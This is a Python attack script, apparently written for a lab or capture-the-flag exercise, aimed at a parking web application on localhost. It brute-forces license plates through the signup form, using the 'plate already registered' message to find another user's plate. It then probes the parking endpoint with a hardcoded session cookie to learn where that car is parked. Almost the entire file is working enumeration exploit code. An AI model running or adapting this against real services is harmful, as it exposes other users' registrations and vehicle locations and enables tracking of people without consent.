import requests
import random
import string
import re
from bs4 import BeautifulSoup

def generate_random_string(size=10):
    return ''.join(random.choice(string.ascii_letters) for _ in range(size))

def register_user():
    passw = '1111'
    
    signup_url = 'http://localhost:3000/signup'
    register_url = 'http://localhost:3000/register'
    red_url = 'http://localhost:3000/'
    park_url = 'http://localhost:3000/park'
    
    existing_plate = None

    # Generate a random username
    
    # Define the valid characters for the license plate
    letter_chars = 'ABCDE'
    number_chars = '0123456789'

    # Define the range of possible license plates
    plates = [(l1 + l2 + l3 + n1 + n2 + n3)
              for l1 in letter_chars
              for l2 in letter_chars
              for l3 in letter_chars
              for n1 in number_chars
              for n2 in number_chars
              for n3 in number_chars]
    
    # Brute force the license plate
    for plate in plates:
        # Get the initial session cookie
        initial_response = requests.get(register_url)
        set_cookie_header = initial_response.headers['Set-Cookie']
        cookie_value = re.search(r'connect.sid=([^;]+)', set_cookie_header).group(1)
        
        headers = {'Cookie': f'connect.sid={cookie_value}'}
        
        username = generate_random_string()
        payload = {
            'username': username,
            'plate': plate,
            'password': passw,
            'password2': passw
        }

        requests.post(signup_url, data=payload, headers=headers)

        response = requests.get(register_url, headers=headers)
        if 'plate already registered' in response.text:
            print(f'License plate {plate} already registered by other user')
            existing_plate = plate
            return existing_plate

if __name__ == '__main__':

    signup_url = 'http://localhost:3000/signup'
    register_url = 'http://localhost:3000/register'
    park_url = 'http://localhost:3000/park'
    red_url = 'http://localhost:3000/'
    cookie = 'connect.sid=s%3AXJd6bnFiY174xJwH-TcCPLpJabSZ2ij-.fvI0KtKqCbBxkUJ%2BqwpKap1l0mjyRHuLblmg41tdzXI'
    headers = {
            'Cookie': cookie
    }
    existing_plate = register_user()    


    response = requests.get(red_url, headers=headers)


    html = response.text


    # Parse the HTML content using BeautifulSoup
    soup = BeautifulSoup(html, 'html.parser')

    # Find the select element and extract the option elements
    options = soup.select('select[name="location"] > option')

    # Extract the location names and IDs from the option elements
    locations = [(option.text, option['id']) for option in options]
    time = 1
    # After finding the parked car, loop through each location
    for location_name, location_id in locations:
        # Send the request and check the response
        payload = {
            'licensePlate': existing_plate,
            'mintime': time,
            'location': location_id
        }

        requests.post(park_url, data=payload, headers=headers)
        response = requests.get(red_url, headers=headers)

        #print(response.text)
        if 'car is already parked' in response.text:
            print(f'This car is already parked at {location_name} with the license plate {existing_plate}.')